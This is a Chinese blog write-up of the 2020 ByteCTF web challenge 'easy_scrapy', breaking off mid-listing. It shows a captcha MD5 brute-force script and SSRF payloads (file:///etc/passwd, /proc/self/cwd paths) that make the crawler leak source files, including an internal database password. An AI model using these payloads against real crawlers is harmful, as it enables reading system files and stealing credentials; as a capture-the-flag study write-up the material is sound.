<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="题解和题目地址：https:&#x2F;&#x2F;github.com&#x2F;ctfwiki&#x2F;ctf_game_history&#x2F;blob&#x2F;master&#x2F;2020&#x2F;ByteCTF.md官方题解：https:&#x2F;&#x2F;bytectf.feishu.cn&#x2F;docs&#x2F;doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D">
<meta property="og:type" content="article">
<meta property="og:title" content="2020年10月ByteCTF部分web题解">
<meta property="og:url" content="http://example.com/2020/10/25/20201025-ByteCTF%E9%A2%98%E8%A7%A3/index.html">
<meta property="og:site_name" content="slug01sh&#39;s blog">
<meta property="og:description" content="题解和题目地址：https:&#x2F;&#x2F;github.com&#x2F;ctfwiki&#x2F;ctf_game_history&#x2F;blob&#x2F;master&#x2F;2020&#x2F;ByteCTF.md官方题解：https:&#x2F;&#x2F;bytectf.feishu.cn&#x2F;docs&#x2F;doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D">
<meta property="og:locale">
<meta property="og:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png">
<meta property="og:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/472EE1BB-6765-4B4D-B9F0-341E25B7D163.png">
<meta property="og:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/AB748B08-5068-48EF-B8EC-536FEB650AAC.png">
<meta property="og:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/F195950B-B1C3-4F53-AEC0-E9502B8ED0AC.png">
<meta property="og:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/DF0CABC7-4537-44C8-8289-28A1F9C990A2.png">
<meta property="article:published_time" content="2020-10-25T01:22:59.000Z">
<meta property="article:modified_time" content="2020-11-08T05:01:32.754Z">
<meta property="article:author" content="slug01sh">
<meta property="article:tag" content="生活">
<meta property="article:tag" content="安全">
<meta property="article:tag" content="编程">
<meta property="article:tag" content="英语">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png">

<link rel="canonical" href="http://example.com/2020/10/25/20201025-ByteCTF%E9%A2%98%E8%A7%A3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh'
  };
</script>

  <title>2020年10月ByteCTF部分web题解 | slug01sh's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">slug01sh's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Think with the world</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-首页">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-标签">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-归档">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-关于">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/25/20201025-ByteCTF%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="slug01sh">
      <meta itemprop="description" content="欢迎大家发表自己的见解与评价">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="slug01sh's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2020年10月ByteCTF部分web题解
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-10-25 09:22:59" itemprop="dateCreated datePublished" datetime="2020-10-25T09:22:59+08:00">2020-10-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-08 13:01:32" itemprop="dateModified" datetime="2020-11-08T13:01:32+08:00">2020-11-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>题解和题目地址：<a target="_blank" rel="noopener" href="https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md">https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md</a><br>官方题解：<a target="_blank" rel="noopener" href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D</a></p>
<hr>
<a id="more"></a>


<p>用于爆破 md5 的脚本（验证码）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crack.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = input()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9999999999</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(str(i)).startswith(c):</span><br><span class="line">            print(i)</span><br><span class="line">            print(<span class="string">&#x27;----------------&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h1><ul>
<li>题目地址：<a target="_blank" rel="noopener" href="http://101.200.50.18:30010/">http://101.200.50.18:30010/</a></li>
<li>官方题解：<a target="_blank" rel="noopener" href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC</a></li>
<li>oxcccccc：<a target="_blank" rel="noopener" href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></li>
<li>N0rth3题解：<a target="_blank" rel="noopener" href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</a></li>
<li>ByteCTF2020-easyscrapy：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></li>
<li>ByteCTF2020—w4nder：<a target="_blank" rel="noopener" href="http://phoebe233.cn/?p=328#easyscrapy">http://phoebe233.cn/?p=328#easyscrapy</a></li>
</ul>
<p>经过测试，该网站会爬取提交的链接以及链接中的外链，并且提交链接的类型只能是 HTTPS。我当时只在提交链接的部分测试了SSRF，以后在做题时，需要边做边写题解，这样会让自己的思路更加的清晰和正确。</p>
<p>在 服务器编写 1.html ，然后提交 url 即可得到 /etc/passwd 文件，成功本地文件包含，返回结果如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">b&#39;&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png"></p>
<p>考虑去读取爬虫的源码，但是并不知道路径，尝试 proc 目录。GET 新姿势，在服务器源码中写入下面的代码并提交。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cmdline&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>proc/self/cmdline 中 /proc/self  是指向当前进程的内存，/proc/self/cmdline 启动进程时执行的命令。类似的接口还有：</p>
<ul>
<li>/proc/$PID/environ 该文件保存进程的环境变量</li>
<li>/proc/$PID/cwd 一个符号连接, 指向进程当前的工作目录</li>
<li>/proc/$PID/exe 一个符号连接, 指向被执行的二进制代码</li>
<li>/proc/$PID/fd 进程所打开的每个文件都有一个符号连接在该子目录里, 以文件描述符命名, 这个名字实际上是指向真正的文件的符号连接</li>
<li>/proc/$PID/attr 进程的属性<br>tip: 当找不到网站路径的时候，可以利用 /proc/self/cwd 目录来读取文件路径</li>
</ul>
<p>当提交请求后的返回结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">b&#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python\x00&#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy\x00crawl\x00byte\x00&#39;</span><br><span class="line"># 解码后：&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy crawl byte</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>b’ 是 Python 的 bytes 类型，表明这个变量在存储的时候是 bytes 类型（二进制形式）。上面的命令可以被化简为 python scrapy crawl byte，这是 scrapy 的启动命令。爬虫的名称叫做 byte，在 spiders 目录中有用。</p>
<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>我们可以参考 <a target="_blank" rel="noopener" href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/topics/commands.html#scrapy">scrapy 的文档</a>，我们可以知道 scrapy 的目录结构（贯穿全文）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">scrapy.cfg</span><br><span class="line">myproject&#x2F;（项目名称，未知）</span><br><span class="line">    __init__.py</span><br><span class="line">    items.py</span><br><span class="line">    pipelines.py</span><br><span class="line">    settings.py</span><br><span class="line">    spiders&#x2F;</span><br><span class="line">        __init__.py</span><br><span class="line">        spider1.py</span><br><span class="line">        spider2.py</span><br><span class="line">        ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>目录结构 +  /proc/self/cwd 来进行文件读取。首先尝试读取 scrapy.cfg 文件（另外的数据需要使用项目名称）。构造 SSRF 的 url 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;scrapy.cfg&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中 /proc/self/cwd/ 指向工作路径（current work directory 简称 cwd），读取工作路径下的 scrapy.cfg 文件。再次提交 url，返回结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># scrapy.cfg</span><br><span class="line"></span><br><span class="line">b&#39;# Automatically created by: scrapy startproject\n#\n# For more information about the [deploy] section see:\n# https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html\n\n[settings]\ndefault &#x3D; bytectf.settings\n\n[deploy]\n#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;\nproject &#x3D; bytectf\n&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这种格式的文本不便于进行阅读，Python 的 Bytes 直接输出就会呈现这种效果，使用 vscode 的替换功能将 \n 转换成“换行”。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/472EE1BB-6765-4B4D-B9F0-341E25B7D163.png"><br>修改为“正则模式”进行替换，将 “\n” 替换成 “\n”。通过上面的文本，我们就能够读取所有的文件了。</p>
<p>尝试读取 setting 文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;setting.py&quot;&gt;（凭感觉在写代码。。）</span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;settings.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>？？？做着做着访问不了了（希望环境没事🙏。等待几分钟后环境恢复，估计是在重启。</p>
<p>参考上面的处理方法，将返回结果整理如下：（参考教程：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fengf233/p/11400262.html%EF%BC%89">https://www.cnblogs.com/fengf233/p/11400262.html）</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># setting.py</span><br><span class="line"></span><br><span class="line">BOT_NAME &#x3D; &#39;bytectf&#39;</span><br><span class="line"># 此Scrapy项目名称</span><br><span class="line"></span><br><span class="line">SPIDER_MODULES &#x3D; [&#39;bytectf.spiders&#39;]</span><br><span class="line"># scrapy查找spider的路径</span><br><span class="line"></span><br><span class="line">NEWSPIDER_MODULE &#x3D; &#39;bytectf.spiders&#39;</span><br><span class="line"># 指定使用genspider时创建spider的路径</span><br><span class="line"></span><br><span class="line">RETRY_ENABLED &#x3D; False</span><br><span class="line"># </span><br><span class="line">ROBOTSTXT_OBEY &#x3D; False</span><br><span class="line"># 表示遵不遵守君子协议，默认False</span><br><span class="line"></span><br><span class="line">DOWNLOAD_TIMEOUT &#x3D; 8</span><br><span class="line"># 超时时间</span><br><span class="line"></span><br><span class="line">USER_AGENT &#x3D; &#39;scrapy_redis&#39;</span><br><span class="line"># 爬虫时使用的默认User-Agent</span><br><span class="line"></span><br><span class="line">SCHEDULER &#x3D; &quot;scrapy_redis.scheduler.Scheduler&quot;</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">DUPEFILTER_CLASS &#x3D; &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">REDIS_HOST &#x3D; &#39;172.20.0.7&#39;</span><br><span class="line"># redis 服务器地址</span><br><span class="line"></span><br><span class="line">REDIS_PORT &#x3D; 6379</span><br><span class="line"># redis 端口</span><br><span class="line"></span><br><span class="line">ITEM_PIPELINES &#x3D; &#123;</span><br><span class="line">&#39;bytectf.pipelines.BytectfPipeline&#39;: 300,</span><br><span class="line">&#125;</span><br><span class="line"># 启用的item管道</span><br></pre></td></tr></table></figure>
<p>在其他人的题解中，他们尝试了攻击 redis，但是没有拿到 shell。我不会（暂时就不尝试了。在这个文件中没有 spider 的名称，考虑从  <strong>init</strong>.py 这个已知的文件入手。尝试读取  <strong>init</strong>.py 文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;spiders&#x2F;__init__.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没有数据</p>
<p>尝试读取 byte.py 文件（暂时还不清楚这个文件名「byte.py」的来源，猜测可能在 items.py、pipelines.py、bytectf/<strong>init</strong>.py 这些没有读取的文件中）。折腾了半天才在启动命令中发现爬虫的名称叫做 byte.py，当时没有理解这个命令的含义，血亏。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;spiders&#x2F;byte.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将回显结果进行整理。代码有点乱，Python 的缩进全无，只能依靠猜测源码大致的模样（\x 乱码使用 print(b””.decode(“utf-8”) 转换为中文)）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># byte.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span>(<span class="params">RedisSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;byte&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        <span class="comment"># 主键，原始 url</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>, url):</span><br><span class="line">                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list) &gt; <span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试读取前面猜测的文件，items.py、pipelines.py、bytectf/<strong>init</strong>.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;items.py&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;pipelines.py&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;__init__.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>回显结果：</p>
<ol>
<li>items.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># items.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># https://docs.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    byte_start = scrapy.Field()  <span class="comment"># 起始页面</span></span><br><span class="line">    byte_url = scrapy.Field()  <span class="comment"># 当前页面</span></span><br><span class="line">    byte_text = scrapy.Field()  <span class="comment"># text</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>pipelines.py（等等，N0rth3 怎么那么熟悉，出题人可还行，没注意）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pipelines.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line">    <span class="comment"># 连接数据库</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取数据库连接信息</span></span><br><span class="line">        MONGODB_HOST = <span class="string">&#x27;172.20.0.8&#x27;</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_USER = <span class="string">&#x27;N0rth3&#x27;</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(</span><br><span class="line">            <span class="string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(</span><br><span class="line">            MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"><span class="comment"># 处理item</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> 